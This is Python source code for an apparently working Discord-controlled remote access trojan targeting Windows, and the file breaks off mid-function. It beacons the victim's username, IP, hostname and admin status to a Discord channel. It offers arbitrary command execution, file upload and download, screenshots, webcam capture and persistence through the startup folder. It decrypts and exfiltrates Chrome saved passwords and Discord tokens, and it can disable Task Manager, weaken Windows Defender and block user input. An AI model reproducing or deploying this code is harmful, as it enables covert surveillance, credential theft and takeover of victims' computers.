import os
import shutil
import subprocess
import pyautogui
import socket
import discord
from discord import Intents, Client, Message, File, Guild, TextChannel, app_commands, Embed
from discord_webhook import DiscordWebhook
from requests import get
import cv2
from time import sleep
import webbrowser
import ctypes
import pyttsx3
from pynput import keyboard
import win32clipboard
import base64
from base64 import b64decode
from Crypto.Cipher import AES
import win32crypt
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
from datetime import datetime
from zipfile import ZipFile
import sqlite3
from datetime import timezone, timedelta
from PIL import ImageGrab
import time
import httpx
import winshell
import sys
import psutil
import tkinter as tk
from tkinter import simpledialog
import glob
from win10toast import ToastNotifier
import keyboard
from win32comext.shell import shell




toast = ToastNotifier()


startup = winshell.startup()

ownFileName = os.path.basename(sys.argv[0])

ownFilePath = os.getcwd()

userprofile = os.getenv('USERPROFILE')
custom_tmp_path = fr"{userprofile}\tmp"
channel_count = None
channel_name = None
name = os.getlogin()
pc_username = os.getlogin()
hostname = socket.gethostname()
ip = get('https://api.ipify.org').content.decode('utf8')
APPDATA_ROAMING = os.getenv('APPDATA')


import wmi

TOKEN = "BOT_TOKEN"


intents: Intents = Intents.default()
intents.message_content = True
client: Client = Client(intents=intents)
tree = app_commands.CommandTree(client)

DETACHED_PROCESS = 0x00000008




tokens = []
cleaned = []
checker = []

webhook_url = []

@client.event
async def on_ready() -> None:
    global channel_count
    global channel_name
    guild: Guild = client.guilds[0]  # Vorausgesetzt, das Skript ist nur auf einem Server aktiv
    await tree.sync(guild=discord.Object(id=1241310790888329257))
    # Anzahl der vorhandenen Bot-Befehl-Kanäle zählen
    channel_name = name
    existing_channels = [c for c in guild.channels if c.name.startswith(channel_name)]
    channel_count = channel_count = len(guild.channels)
    print(channel_count)
    # Neuen Kanal mit aktualisierter Nummer erstellen
    channel = await guild.create_text_channel(name=f"{channel_name} {channel_count}")

    # Webhook für den neuen Kanal erstellen
    webhook = await channel.create_webhook(name="Bot Webhook")

    webhook_url.append(webhook.url)

    
    # Eine Nachricht nur im neuen Kanal mit dem Webhook senden
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    message = f"@here User online: __Username: {name}__ | __Ip-Adress: {ip}__ | __Computer-Name: {hostname}__ | __Admin:{is_admin} __"
    await webhook.send(content=message)

    message = f"""```/help for all commands```"""
    await webhook.send(content=message)
    print ("Ready")



def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)


                        return f"""```Email: {email}\nPhone: {phone}\n2FA/MFA Enabled: {mfa_enabled}\nNitro: {has_nitro}\nExpires in (days): {days_left if days_left else 'None'}\nToken: {tok} ```"""
                else: continue

def show_message_box(text):
    ctypes.windll.user32.MessageBoxW(0, text, " ", 0)


    
#slash commands


#/help
@tree.command(
    name="help",
    description="display all commands",
    guild=discord.Object(id=1241310790888329257)
)
async def help_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        embed = discord.Embed(colour=0xf100f5)

        embed.add_field(name="__File__",
                        value="```/dir -> display files in current directory\n/cd -> change directory \n/currentdir -> display current direction\n/cmd -> execute cmd command and display output\n/delete -> delete file or folder\n/upload -> upload a file to the computer\n/download -> download a file \n/zip -> create zip file from folder\n/spamtxt -> create txt files\n/startup -> add file to startup```",
                        inline=False)
        embed.add_field(name="__Picture__",
                        value="```/screenshot -> get screenshot from current first monitor\n/webcampic -> capture webcam picture\n/wallpaper -> set desktop wallpaper```",
                        inline=False)
        embed.add_field(name="__Tasks__",
                        value="```/listtasks -> list all running processes\n/kill -> end a process```",
                        inline=False)
        embed.add_field(name="__Browser__",
                        value="```/chromepass -> get passwords saved in chrome browser\n/openwebsite -> open a website```",
                        inline=False)
        embed.add_field(name="__PC__",
                        value="```/restart -> restart the pc\n/turnoff -> turn pc off\n/logoff -> logoff current user/admincheck -> check if you have admin\n/requestadmin -> request admin, can last a view minutes (will open a new text channel)```",
                        inline=False)
        embed.add_field(name="__Other__",
                        value="```/notify -> display a message box\n/voice -> text to speech \n/dcinfo -> grab discord info (email, phone, 2fa/mfa info, nitro info, token)\n/dcinject -> inject script into discord and get email and password if changed or logged in\n/startkeylogger -> log pressed keys\n/stopkeylogger -> safe logged keys in file and send it\n/findantivirus -> search for installed antivirus```",
                        inline=False)
        embed.add_field(name="__Admin Only__",
                        value="```/disabletaskmgr -> disables taskmanager\n/enabletaskmgr -> enable taskmanager\n/disablewindowsdefender -> disable windows defender\n/blockinput -> block user mouse and keyboard inputs\n/unblockinput -> unblock user mouse and keyboard inputs```",
                        inline=False)


        await interaction.response.send_message(embed=embed)


#/dir
@tree.command(
    name="dir",
    description="display files in current directory",
    guild=discord.Object(id=1241310790888329257)
)
async def dir_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            subprocess.Popen(fr'dir > {custom_tmp_path}\dir.txt', shell=True)
            time.sleep(1)
            file = discord.File(fr"{custom_tmp_path}\dir.txt")
            await interaction.response.send_message(file=file)
            time.sleep(1)
            subprocess.Popen(fr'del {custom_tmp_path}\dir.txt', shell=True)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")


#/startup
@tree.command(
    name="startup",
    description="adds file to startup",
    guild=discord.Object(id=1241310790888329257)
)
async def startup_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        path = sys.argv[0]
        subprocess.Popen(fr'copy "{path}" "{startup}" /Y', shell=True)
        await interaction.response.send_message("```file should be in startup```")


#/disabletaskmgr
@tree.command(
    name="disabletaskmgr",
    description="disable task manager",
    guild=discord.Object(id=1241310790888329257)
)
async def disabletaskmgr_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            global statuuusss
            import time
            statuuusss = None
            import subprocess
            import os
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                import winreg as reg
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                import os
                subprocess.Popen(r'powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force', shell=True)
            else:
                import os
                subprocess.Popen(r'powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force', shell=True)
            await interaction.response.send_message("````taskmanager disabled````")
        else:
            await interaction.response.send_message("````[***] You need admin [***]````")


#/enabletaskmgr
@tree.command(
    name="enabletaskmgr",
    description="enable task manager",
    guild=discord.Object(id=1241310790888329257)
)
async def enabletaskmgr_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:

        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            global statusuusss
            import time
            statusuusss = None
            import subprocess
            import os
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                await interaction.response.send_message("````taskmanager enabled````")
            else:
                import winreg as reg
                reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                await interaction.response.send_message("````taskmanager enabled````")
        else:
            await interaction.response.send_message("````[***] You need admin [***]````")


#/disablewindowsdefender
@tree.command(
    name="disablewindowsdefender",
    description="disable windows defender",
    guild=discord.Object(id=1241310790888329257)
)
async def disablewindowsdefender_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:            
            import subprocess
            instruction = r""" REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            result = str(shell().stdout.decode('CP437'))
            done = result.split()
            boom = done[2:]
            if boom <= ['17763']:
                os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                await interaction.response.send_message("```disabled windows defender```")
            elif boom >= ['18362']:
                os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
                await interaction.response.send_message("```disabled windows defender```")
            else:
                await interaction.response.send_message("```error```")     
        else:
            await interaction.response.send_message("```[***] you need admin [***]```")      



#/blockinput
@tree.command(
    name="blockinput",
    description="block user mouse and keyboard input",
    guild=discord.Object(id=1241310790888329257)
)
async def blockinput_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await interaction.response.send_message("````blocked user input````")
        else:
            await interaction.response.send_message("```[***] you need admin [***]```")


#/unblockinput
@tree.command(
    name="unblockinput",
    description="unblock user mouse and keyboard input",
    guild=discord.Object(id=1241310790888329257)
)
async def unblockinput_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await interaction.response.send_message("````unblocked user input````")
        else:
            await interaction.response.send_message("```[***] you need admin [***]```")





#/cd
@tree.command(
    name="cd",
    description="change directory",
    guild=discord.Object(id=1241310790888329257)
)
async def cd_command(interaction, path: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(path)):
            os.chdir(path)
            await interaction.response.send_message(f"```{path}```")
        else:
            await interaction.response.send_message(f"```{path} is not a directory```")

#/currentdir
@tree.command(
    name="currentdir",
    description="display current directory",
    guild=discord.Object(id=1241310790888329257)
)
async def currentdir_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        await interaction.response.send_message(f"```{os.getcwd()}```")


#/cmd
@tree.command(
    name="cmd",
    description="execute cmd command and display output",
    guild=discord.Object(id=1241310790888329257)
)
async def cmd_command(interaction, command: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            subprocess.Popen(command, shell=True)
            cmd: str = subprocess.check_output(command, shell=True)
            with open(fr"{custom_tmp_path}\cmd.txt", "wb") as file:
                file.write(cmd)

            time.sleep(1)
            file = discord.File(fr"{custom_tmp_path}\cmd.txt")
            await interaction.response.send_message(file=file)
            time.sleep(1)
            subprocess.Popen(fr'del {custom_tmp_path}\cmd.txt', shell=True)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")

#/delete
@tree.command(
    name="delete",
    description="delete file/folder/path",
    guild=discord.Object(id=1241310790888329257)
)
async def delete_command(interaction, path: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        process = subprocess.Popen(fr'del {path}', shell=True)
        process.communicate()
        if(process.returncode == 0):
            await interaction.response.send_message(f"```{path} deleted!```")
        else:
            await interaction.response.send_message(f"```{path} could not be deleted!```")


#/upload
@tree.command(
    name="upload",
    description="upload a file to the target computer",
    guild=discord.Object(id=1241310790888329257)
)
async def upload_command(interaction, file: discord.Attachment, filename: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        await file.save(filename)
        time.sleep(1)
        if(os.path.isfile(filename)):
            time.sleep(1)
            await interaction.response.send_message(f"```{filename} uploaded!```")
        else: 
            time.sleep(1)
            await interaction.response.send_message(f"```Error while uploading {filename}```")



#/download
@tree.command(
    name="download",
    description="download a file from target computer",
    guild=discord.Object(id=1241310790888329257)
)
async def download_command(interaction, file: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        file = discord.File(file)
        await interaction.response.send_message(file=file)


#/zip
@tree.command(
    name="zip",
    description="create a zip file",
    guild=discord.Object(id=1241310790888329257)
)
async def zip_command(interaction, zipfoldername: str, foldername: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        process = subprocess.Popen(fr"tar.exe acvf {zipfoldername}.zip {foldername}", shell=True)
        process.communicate()
        if(process.returncode == 0):
             await interaction.response.send_message("```zip folder created```")
        else:
            await interaction.response.send_message("```could not create zip file```")


#/spamtxt
@tree.command(
    name="spamtxtfiles",
    description="create a certain amount of txt files",
    guild=discord.Object(id=1241310790888329257)
)
async def spamtxtfiles_command(interaction, filename: str, filecontent: str, amount: int):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        for i in range(amount):
            filename_with_index = f"{filename}_{i}"
            process = subprocess.Popen(f"echo {filecontent} > {filename_with_index}.txt", shell=True)
            process.communicate()

        if(process.returncode == 0):
            await interaction.response.send_message(f"```Successfully created {amount} files```")
        else:
            await interaction.response.send_message(f"```could not create {amount} files```")



#/screenshot
@tree.command(
    name="screenshot",
    description="get screenshot from current first monitor",
    guild=discord.Object(id=1241310790888329257)
)
async def screenshot_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            screenshot = pyautogui.screenshot()
            screenshot.save(fr'{custom_tmp_path}\screenshot.png')
            time.sleep(1)
            file = discord.File(fr"{custom_tmp_path}\screenshot.png")
            await interaction.response.send_message(file=file)
            time.sleep(1)
            subprocess.Popen(fr'del {custom_tmp_path}\screenshot.png', shell=True)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")

#/webcampic
@tree.command(
    name="webcampic",
    description="capture webcam picture",
    guild=discord.Object(id=1241310790888329257)
)
async def webcampic_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            device_num = 0
            dir_path = fr"{custom_tmp_path}"
            basename = "camera_capture"
            ext='jpg'
            interval=1
            cap = cv2.VideoCapture(device_num)
            if not cap.isOpened():
                await interaction.response.send_message("```no cam available```")
                return
            os.makedirs(dir_path, exist_ok=True)
            base_path = os.path.join(dir_path, basename)
            n = 0
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                cv2.imwrite('{}_{}.{}'.format(base_path, n, ext), frame)
                n += 1
                # Warte für das nächste Bild
                cv2.waitKey(interval * 1000)
                if os.path.isfile(fr"{custom_tmp_path}\camera_capture_3.jpg"):

                    subprocess.Popen(fr'del {custom_tmp_path}\camera_capture_2.jpg', shell=True)

                    subprocess.Popen(fr'del {custom_tmp_path}\camera_capture_1.jpg', shell=True)

                    subprocess.Popen(fr'del {custom_tmp_path}\camera_capture_0.jpg', shell=True)

                    break
            cap.release()
            fileName = fr"{custom_tmp_path}\camera_capture_3.jpg"
            file = discord.File(fileName)
            await interaction.response.send_message(file=file)
            os.system(f"del {fileName}")

        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")


#/wallpaper
@tree.command(
    name="wallpaper",
    description="set desktop wallpaper",
    guild=discord.Object(id=1241310790888329257)
)
async def wallpaper_command(interaction, file: discord.Attachment):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            await file.save(fr"{custom_tmp_path}\wallpaper.png")
            path = fr"{custom_tmp_path}\wallpaper.png"
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path , 0)
            await interaction.response.send_message("```changed wallpaper```")
            time.sleep(1)
            subprocess.Popen(fr'del {custom_tmp_path}\wallpaper.png', shell=True)

        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")


#/listtasks
@tree.command(
    name="listtasks",
    description="list all running processes",
    guild=discord.Object(id=1241310790888329257)
)
async def listtasks_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if os.path.isdir(custom_tmp_path):
            f = wmi.WMI()

            for process in f.Win32_Process():
                with open(fr"{custom_tmp_path}\tasklist.txt", "a+") as file:
                    file.write(f"{process.ProcessId:<10} {process.Name}\n") 

            #file = discord.File(fr"{custom_tmp_path}\tasklist.txt")
            #await interaction.response.send_message(file=file)


            time.sleep(3)

            print(webhook_url[0])
            file = {'file': (f'{custom_tmp_path}\\tasklist.txt', open(f'{custom_tmp_path}\\tasklist.txt', 'rb'), 'text/plain')}
            requests.post(webhook_url[0], files=file)


            subprocess.Popen(fr'del {custom_tmp_path}\tasklist.txt', shell=True)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}")
            await interaction.response.send_message("```Error... try again```")



#/kill
@tree.command(
    name="kill",
    description="kill a process",
    guild=discord.Object(id=1241310790888329257)
)
async def kill_command(interaction, program: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        process = subprocess.Popen(fr"taskkill /IM {program} /F", shell=True)
        process.communicate()  # Warten, bis der Prozess abgeschlossen ist
        if process.returncode == 0:
            await interaction.response.send_message(f"```{program} killed!```")
        else:
            await interaction.response.send_message(f"```there was an error while killing {program}```")

#/chromepass
@tree.command(
    name="chromepass",
    description="get passwords saved in chrome browser",
    guild=discord.Object(id=1241310790888329257)
)
async def chromepass_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            key = fetching_encryption_key() 
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                                   "Google", "Chrome", "User Data", "default", "Login Data") 
            filename = fr"{custom_tmp_path}\ChromePasswords.db"
            shutil.copyfile(db_path, filename) 

            # connecting to the database 
            db = sqlite3.connect(filename) 
            cursor = db.cursor() 

            # 'logins' table has the data 
            cursor.execute( 
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used") 

            # iterate over all rows 
            for row in cursor.fetchall(): 
                main_url = row[0] 
                login_page_url = row[1] 
                user_name = row[2] 
                decrypted_password = password_decryption(row[3], key) 
                date_of_creation = row[4] 
                last_usuage = row[5] 

                if user_name or decrypted_password: 

                    with open(fr"{custom_tmp_path}\passwords.txt", "a") as file:
                        file.write(f"Main URL: {main_url}\n") 
                        file.write(f"Login URL: {login_page_url}\n")
                        file.write(f"User name: {user_name}\n") 
                        file.write(f"Decrypted Password: {decrypted_password}\n") 

                else: 
                    continue
                
                if date_of_creation != 86400000000 and date_of_creation: 
                    with open(fr"{custom_tmp_path}\passwords.txt", "a") as file:
                        file.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")

                if last_usuage != 86400000000 and last_usuage: 
                    with open(fr"{custom_tmp_path}\passwords.txt", "a") as file:
                        file.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")  
                with open(fr"{custom_tmp_path}\passwords.txt", "a") as file:
                    file.write("=" * 100 + "\n")
            cursor.close() 
            db.close() 


            try: 

                # trying to remove the copied db file as  
                # well from local computer 
                os.remove(fr"{custom_tmp_path}\ChromePasswords.db") 
            except: 
                pass

            fileName = fr"{custom_tmp_path}\passwords.txt"
            try:
                file = discord.File(fileName)
                await interaction.response.send_message(file=file)
                time.sleep(1)
                subprocess.Popen(fr'del {fileName}', shell=True)

            except Exception as e:
                await interaction.response.send_message("```No passwords saved in Chrome```")
                pass
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")



#/openwebsite
@tree.command(
    name="openwebsite",
    description="Open a website",
    guild=discord.Object(id=1241310790888329257)
)
async def openWebsite_command(interaction, url: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        webbrowser.open(url)
        await interaction.response.send_message("Website opened!")



#/restart
@tree.command(
    name="restart",
    description="restart target computer",
    guild=discord.Object(id=1241310790888329257)
)
async def restart_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        subprocess.Popen(fr'shutdown -r -t 0', shell=True)

#/turnoff
@tree.command(
    name="turnoff",
    description="turn off target computer",
    guild=discord.Object(id=1241310790888329257)
)
async def turnoff_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        subprocess.Popen(fr'shutdown -s -t 0', shell=True)

#/logoff
@tree.command(
    name="logoff",
    description="log off current user",
    guild=discord.Object(id=1241310790888329257)
)
async def logoff_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        subprocess.Popen(fr'shutdown /l', shell=True)


#/notify
@tree.command(
    name="notify",
    description="display a notification in the right down corner",
    guild=discord.Object(id=1241310790888329257)
)
async def notify_command(interaction, title: str, text: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:

        toast.show_toast(
            title,
            text,
            duration = 40,
